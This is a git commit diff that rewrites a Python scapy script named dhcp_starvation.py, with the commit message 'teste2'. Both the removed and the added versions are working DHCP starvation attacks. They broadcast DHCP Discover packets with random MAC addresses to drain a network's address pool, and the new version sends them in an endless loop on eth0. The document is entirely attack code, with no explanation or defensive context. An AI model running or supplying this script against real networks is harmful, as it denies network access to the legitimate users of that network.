976e691c51b89b9ed0d19ec7b1ff74d725266bc5
João Paulo Gomes Barbosa <joaopaulo_b2008@hotmail.com>
2024-07-10 09:49:15 -0300

    teste2

--- dhcp_starvation.py
+++ dhcp_starvation.py
@@ -1,31 +1,12 @@
 from scapy.all import *
-import random
-import time
 
-def dhcp_starvation(interface, num_packets, delay):
-    for _ in range(num_packets):
-        # Gerar um endereço MAC aleatório
-        mac_address = RandMAC()
-        print(f"Sending DHCP Discover with MAC {mac_address}")
+conf.checkIPaddr = False
 
-        # Construir o pacote DHCP Discover
-        dhcp_discover = (
-            Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff") /
-            IP(src="0.0.0.0", dst="255.255.255.255") /
-            UDP(sport=68, dport=67) /
-            BOOTP(chaddr=mac_address) /
-            DHCP(options=[("message-type", "discover"), ("end")])
-        )
+DHCP_DISCOVER = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC(), type=0x0800) \
+            / IP(src='0.0.0.0', dst='255.255.255.255') \
+            / UDP(dport=67,sport=68) \
+            / BOOTP(op=1, chaddr=RandMAC()) \
+            / DHCP(options=[('message-type','discover'), ('end')])
 
-        # Enviar o pacote DHCP Discover
-        sendp(dhcp_discover, iface=interface, verbose=0)
 
-        # Aguardar um pequeno intervalo entre os pacotes
-        time.sleep(delay)
-
-if __name__ == "__main__":
-    interface = "eth0"   # Altere para a interface correta, por exemplo, "wlan0" ou "eth1"
-    num_packets = 1000   # Ajuste conforme necessário
-    delay = 0.1          # Ajuste conforme necessário
-
-    dhcp_starvation(interface, num_packets, delay)
+sendp(DHCP_DISCOVER, iface='eth0',loop=1,verbose=1 )
